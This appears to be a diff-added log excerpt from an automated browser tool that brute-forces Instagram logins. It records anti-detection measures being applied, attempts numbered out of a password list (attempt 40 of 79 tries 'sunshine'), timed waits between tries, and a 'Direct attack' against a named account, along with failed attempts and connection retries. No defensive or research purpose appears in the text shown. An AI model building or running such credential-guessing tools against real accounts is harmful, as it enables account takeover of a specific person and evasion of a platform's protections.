+2025-05-25 09:33:57,367 - INFO - 🖥️ Virtual display started: :88
+2025-05-25 09:33:57,368 - INFO - Creating chrome browser session...
+2025-05-25 09:33:57,368 - INFO - ====== WebDriver manager ======
+2025-05-25 09:33:57,438 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:33:57,450 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:33:57,461 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:33:57,784 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:33:57,784 - INFO - ✅ Browser session created successfully
+2025-05-25 09:33:57,784 - INFO - Navigating to Instagram...
+2025-05-25 09:34:02,275 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:35:02,434 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:35:02,505 - INFO - ✅ Browser session closed
+2025-05-25 09:35:02,506 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdbb0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/b8ca0b4800626bb28ce6f22b7b3f49d2
+2025-05-25 09:35:02,506 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccfd70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/b8ca0b4800626bb28ce6f22b7b3f49d2
+2025-05-25 09:35:02,506 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd1c0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/b8ca0b4800626bb28ce6f22b7b3f49d2
+2025-05-25 09:35:02,507 - INFO - ✅ Browser session closed
+2025-05-25 09:35:02,507 - INFO - Attempt 40/79: sunshine
+2025-05-25 09:35:02,507 - INFO - Waiting 7.6s before next attempt...
+2025-05-25 09:35:10,126 - INFO - 🎯 Direct attack: alx.trading:sunshine
+2025-05-25 09:35:12,128 - INFO - 🖥️ Virtual display started: :26
+2025-05-25 09:35:14,129 - INFO - 🖥️ Virtual display started: :82
+2025-05-25 09:35:14,129 - INFO - Creating chrome browser session...
+2025-05-25 09:35:14,130 - INFO - ====== WebDriver manager ======
+2025-05-25 09:35:14,210 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:35:14,222 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:35:14,231 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:35:14,577 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:35:14,578 - INFO - ✅ Browser session created successfully
+2025-05-25 09:35:14,578 - INFO - Navigating to Instagram...
+2025-05-25 09:35:18,787 - INFO - Current URL: https://www.instagram.com/accounts/login/
